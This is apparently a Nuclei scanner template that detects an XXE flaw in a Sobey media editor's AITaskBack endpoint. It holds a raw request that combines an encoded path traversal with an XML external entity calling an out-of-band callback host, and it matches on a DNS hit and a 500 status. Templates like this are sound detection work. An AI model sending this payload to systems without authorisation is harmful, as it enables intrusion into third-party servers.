id: Sobey-AITaskBack-xxe

info:
  name: Sobey-AITaskBack-xxe
  author: iSee857
  severity: high
  description: |
    Sobey-AITaskBack-xxe.
  metadata:
    verified: true
    max-request: 1

http:
  - raw:
      - |
        POST /sobey-mchEditor/js/%2e%2e/mch/AIInt/AITaskBack?contentid=1&token=&siteCode= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}/xxe_test">
        ]>
        <root>
          <TextResult>&xxe;</TextResult>
        </root>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 500
